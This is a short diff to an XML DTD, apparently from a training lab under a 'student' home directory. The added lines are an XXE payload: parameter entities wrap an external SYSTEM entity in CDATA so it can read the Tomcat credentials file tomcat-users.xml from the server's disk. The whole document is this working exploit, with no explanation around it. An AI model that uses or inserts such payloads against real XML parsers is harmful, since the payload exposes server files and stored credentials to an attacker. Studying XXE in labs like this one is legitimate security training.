@@ -1,1 +1,5 @@
-<!ENTITY wrapper "%start;%file;%end;">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
+<!ENTITY % end "]]>">
+<!ENTITY wrapper "%start;%file;%end;"
+>
